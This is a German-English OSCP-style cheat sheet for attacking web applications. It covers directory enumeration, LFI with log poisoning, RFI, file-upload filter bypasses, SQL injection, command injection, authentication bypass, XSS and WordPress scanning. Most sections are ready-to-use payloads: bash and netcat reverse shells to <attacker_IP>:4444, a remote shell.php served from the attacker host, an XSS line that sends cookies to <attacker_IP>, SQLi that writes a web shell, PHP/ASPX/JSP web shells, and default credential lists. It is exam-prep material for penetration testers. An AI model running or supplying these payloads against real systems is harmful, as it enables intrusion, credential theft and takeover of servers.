# WEB APPLICATION TESTING - OSCP METHODOLOGY

## 1. DIRECTORY/FILE ENUMERATION (Wahrscheinlichkeit: 100%)

### Must-Do Tools:
```bash
# Gobuster (OSCP Standard!)
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old,zip
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Feroxbuster (schneller, rekursiv)
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Wfuzz (für Parameter)
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<IP>/FUZZ

# Nikto (Vulnerability Scanner)
nikto -h http://<IP>
```

### Wichtige Wordlists:
```
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # STANDARD!
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
```

## 2. LOCAL FILE INCLUSION (LFI) (Wahrscheinlichkeit: 40%)

### Identifikation:
```
URLs mit Parametern wie:
?file=
?page=
?include=
?path=
?doc=
?folder=
?lang=
```

### Testing:
```bash
# Basic LFI
http://<IP>/index.php?page=../../../etc/passwd
http://<IP>/index.php?page=....//....//....//etc/passwd
http://<IP>/index.php?page=..%2F..%2F..%2Fetc%2Fpasswd

# Null Byte Bypass (PHP < 5.3)
http://<IP>/index.php?page=../../../etc/passwd%00

# Path Traversal Variations
../../etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd

# Windows
http://<IP>/index.php?page=../../../windows/win.ini
http://<IP>/index.php?page=../../../windows/system32/drivers/etc/hosts
http://<IP>/index.php?page=C:\windows\system32\drivers\etc\hosts
```

### LFI to RCE:
```bash
# Log Poisoning (Apache)
# 1. Access Log schreiben
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>

# 2. Include Log File
http://<IP>/index.php?page=../../../var/log/apache2/access.log&cmd=whoami

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://input (POST data execution)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
expect://whoami

# Session File Inclusion
http://<IP>/index.php?page=../../../var/lib/php/sessions/sess_<SESSION_ID>
```

## 3. REMOTE FILE INCLUSION (RFI) (Wahrscheinlichkeit: 15%)

```bash
# Basic RFI
http://<IP>/index.php?page=http://<attacker_IP>/shell.php

# Host shell.php on attacker:
<?php system($_GET['cmd']); ?>

# Python HTTP Server
python3 -m http.server 80

# Test RFI
http://<IP>/index.php?page=http://<attacker_IP>/shell.php&cmd=whoami
```

## 4. FILE UPLOAD VULNERABILITIES (Wahrscheinlichkeit: 50%)

### File Upload Bypass Techniques:
```bash
# 1. Null Byte Injection (old PHP)
shell.php%00.jpg

# 2. Double Extensions
shell.php.jpg
shell.php.png
shell.jpg.php

# 3. Case Manipulation
shell.PhP
shell.pHp

# 4. Magic Bytes
# Add GIF header to PHP file:
GIF89a;
<?php system($_GET['cmd']); ?>

# 5. Content-Type Manipulation
# Change Content-Type in Burp to image/jpeg

# 6. Alternative Extensions
.phtml
.php3
.php4
.php5
.phar
.phps

# 7. Executable Shells
.aspx (Windows/IIS)
.jsp (Tomcat)
.war (Tomcat - deployment)
```

### PHP Reverse Shell (nach Upload):
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1'");
?>

# Oder:
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> 4444 >/tmp/f"); ?>
```

## 5. SQL INJECTION (Wahrscheinlichkeit: 35%)

### Detection:
```sql
# Basic Tests
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
admin'--
admin"--
```

### UNION-Based SQLi:
```sql
# Find Column Count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...bis Error

# UNION SELECT
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Data Extraction (MySQL)
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--

# Read File (MySQL)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
' UNION SELECT 1,LOAD_FILE('C:/windows/system32/drivers/etc/hosts'),3--

# Write File (MySQL)
' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php'--
```

### SQLMap (automated):
```bash
# Basic Scan
sqlmap -u "http://<IP>/index.php?id=1"

# With Cookies
sqlmap -u "http://<IP>/index.php?id=1" --cookie="PHPSESSID=abc123"

# POST Request
sqlmap -u "http://<IP>/login.php" --data="username=admin&password=test"

# Dump Database
sqlmap -u "http://<IP>/index.php?id=1" --dump

# OS Shell
sqlmap -u "http://<IP>/index.php?id=1" --os-shell

# Read File
sqlmap -u "http://<IP>/index.php?id=1" --file-read="/etc/passwd"

# Write File
sqlmap -u "http://<IP>/index.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"
```

## 6. COMMAND INJECTION (Wahrscheinlichkeit: 25%)

### Identifikation:
```
URLs/Inputs mit:
- ping
- traceroute
- whois
- dig
- nslookup
- System commands
```

### Injection Payloads:
```bash
# Command Separators
; whoami
& whoami
&& whoami
| whoami
|| whoami
` whoami `
$(whoami)

# URL Encoded
%0a whoami
%0d whoami

# Examples
127.0.0.1; whoami
127.0.0.1 & id
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la
test`whoami`
test$(id)

# Reverse Shell
; bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
; nc -e /bin/bash <attacker_IP> 4444
; python -c 'import socket...'
```

## 7. AUTHENTICATION BYPASS (Wahrscheinlichkeit: 20%)

### Default Credentials (IMMER TESTEN!):
```
admin:admin
admin:password
administrator:administrator
root:root
root:toor
tomcat:tomcat
admin:admin123
guest:guest
```

### SQL Injection Bypass:
```sql
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
```

### NoSQL Injection (MongoDB):
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

## 8. XXS (CROSS-SITE SCRIPTING) (Wahrscheinlichkeit: 15% - Weniger in OSCP)

### Reflected XSS:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Stored XSS:
```html
<script>document.location='http://<attacker_IP>/?c='+document.cookie</script>
```

## 9. WORDPRESS ENUMERATION (Wahrscheinlichkeit: 25%)

```bash
# WPScan
wpscan --url http://<IP>
wpscan --url http://<IP> --enumerate u  # Users
wpscan --url http://<IP> --enumerate p  # Plugins
wpscan --url http://<IP> --enumerate t  # Themes
wpscan --url http://<IP> --enumerate vp # Vulnerable plugins

# Brute Force
wpscan --url http://<IP> -U users.txt -P /usr/share/wordlists/rockyou.txt

# Manual Enumeration
http://<IP>/wp-admin
http://<IP>/wp-login.php
http://<IP>/wp-content/plugins/
http://<IP>/wp-content/themes/
http://<IP>/wp-content/uploads/
http://<IP>/wp-json/wp/v2/users  # User enumeration

# Common WordPress Files
http://<IP>/readme.html  # Version
http://<IP>/license.txt
http://<IP>/wp-config.php.bak  # Database credentials!
```

## 10. COMMON WEB SHELLS

### PHP:
```php
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"); ?>
```

### ASP/ASPX:
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe", "/c " + Request["cmd"]).WaitForExit(); %>
```

### JSP:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## 11. HÄUFIGE OSCP WEB SZENARIEN

### Szenario 1: Directory Traversal → File Upload → Shell (40%)
```
1. Gobuster → /upload, /admin
2. File Upload Form
3. Bypass Filter (shell.php.jpg, GIF89a;)
4. Access shell → http://<IP>/uploads/shell.php?cmd=whoami
5. Reverse Shell
```

### Szenario 2: LFI → Log Poisoning → RCE (20%)
```
1. Finde LFI: ?page=../../../etc/passwd
2. Poison Access Log mit User-Agent
3. Include Log: ?page=../../../var/log/apache2/access.log&cmd=whoami
4. Reverse Shell
```

### Szenario 3: SQLi → File Write → Shell (15%)
```
1. SQLi in ?id=1
2. UNION SELECT → Test
3. LOAD_FILE → Read /etc/passwd
4. INTO OUTFILE → Write shell.php
5. Access Shell
```

### Szenario 4: WordPress → Plugin Exploit → Shell (10%)
```
1. WPScan → Vulnerable Plugin
2. searchsploit → Exploit
3. Upload Shell via Plugin
4. Access Shell
```

### Szenario 5: Tomcat → Manager → WAR Upload (10%)
```
1. Find /manager/html
2. Default creds: tomcat:tomcat
3. Create WAR: msfvenom -p java/jsp_shell_reverse_tcp
4. Upload WAR
5. Access deployed app → Shell
```

## 12. WEB TESTING CHECKLIST

```
☐ Directory/File Enumeration (gobuster - PFLICHT!)
☐ robots.txt, sitemap.xml
☐ Source Code Review
☐ Technology Detection (whatweb, wappalyzer)
☐ Default Credentials
☐ SQL Injection (forms, parameters)
☐ LFI/RFI (file parameters)
☐ File Upload Bypass
☐ Command Injection (ping, system commands)
☐ Authentication Bypass
☐ Hidden Parameters (param mining)
☐ API Endpoints (/api, /v1, /rest)
☐ Backup Files (.bak, .old, ~, .swp)
☐ Config Files (web.config, .htaccess)
☐ Git Exposure (/.git/)
☐ WordPress (if applicable)
☐ Known CVEs (searchsploit)
```

## 13. WAHRSCHEINLICHKEITEN NACH TYP

```
Directory Enum Leads:        80%
File Upload:                 50%
LFI:                        40%
SQLi:                       35%
Command Injection:          25%
WordPress:                  25%
Default Credentials:        20%
RFI:                        15%
API Exploitation:           15%
XSS:                        15%
Tomcat Manager:             10%
Jenkins:                    10%
Deserialization:            5%
```

## 14. TIME MANAGEMENT

```
0-10 min:  Directory Enumeration (gobuster)
10-15 min: Manual Testing (forms, parameters)
15-20 min: LFI/RFI Testing
20-25 min: SQLi Testing
25-30 min: File Upload Testing
30+ min:   Deeper enumeration, CVE research
```

## 15. HÄUFIGE FEHLER

```
❌ Gobuster ohne Extensionen (-x php,txt,html)
✅ Immer mit relevanten Extensions!

❌ Nur eine Wordlist
✅ Mehrere Wordlists versuchen!

❌ Source Code nicht anschauen
✅ IMMER View Source!

❌ Backup Files ignorieren
✅ .bak, .old, ~, .swp testen!

❌ Default Credentials nicht testen
✅ admin:admin IMMER probieren!

❌ WordPress nicht scannen
✅ WPScan wenn WordPress!
```

## 16. GOLDEN RULES WEB TESTING

```
1. Gobuster/Feroxbuster ist PFLICHT!
2. Immer mit Extensions scannen (-x php,txt,html,bak)
3. Source Code IMMER anschauen!
4. Default Credentials IMMER testen!
5. LFI/RFI bei File-Parametern testen!
6. File Upload → Bypass Versuche!
7. SQLi in allen Input-Feldern testen!
8. Backup/Config Files (.bak, .old) suchen!
9. robots.txt, sitemap.xml checken!
10. Try Harder = More Wordlists!
```
